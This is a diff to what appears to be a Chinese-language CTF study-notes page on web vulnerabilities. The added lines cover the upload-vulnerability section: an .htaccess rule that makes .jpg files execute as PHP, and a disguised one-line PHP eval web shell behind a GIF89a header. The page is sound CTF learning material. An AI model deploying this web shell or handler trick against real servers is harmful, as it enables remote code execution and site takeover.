@@ -436,8 +436,13 @@ var_dump(intval($f*100));
 <p>具体详细的原理可以看这位<a href="http://www.haodaquan.com/12">师傅</a>的描述</p>
 <h1 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h1><p>上传漏洞继承Web应用的权限(权限不会很高)</p>
 <p>脚本文件要被访问后才有机会执行其中的恶意指令</p>
-<h2 id="htaccess-上传漏洞"><a href="#htaccess-上传漏洞" class="headerlink" title=".htaccess 上传漏洞"></a>.htaccess 上传漏洞</h2><p>使<code>jpg</code>当做<code>php</code>解析</p>
+<h2 id="htaccess-上传漏洞"><a href="#htaccess-上传漏洞" class="headerlink" title=".htaccess 上传漏洞"></a>.htaccess 上传漏洞</h2><p><a href="https://www.nssctf.cn/problem/1094">题</a></p>
+<p>使<code>jpg</code>当做<code>php</code>解析</p>
 <pre><code class="text">AddType application/x-httpd-php .jpg
+</code></pre>
+<p>可能会判断<code>&lt;?php&gt;</code><br>来一个没有标志的一句话</p>
+<pre><code class="php">GIF89a
+&lt;script language=&#39;php&#39;&gt;@eval($_POST[&quot;a&quot;]);&lt;/script&gt;
 </code></pre>
 <h1 id="sql注入waf绕过"><a href="#sql注入waf绕过" class="headerlink" title="sql注入waf绕过"></a>sql注入waf绕过</h1><h1 id="zip-bomb"><a href="#zip-bomb" class="headerlink" title="zip bomb"></a>zip bomb</h1><p><a href="https://www.nssctf.cn/problem/400">题</a></p>
 <p>不要尝试解压，而是用winrar打开或者改成<code>.rar</code></p>
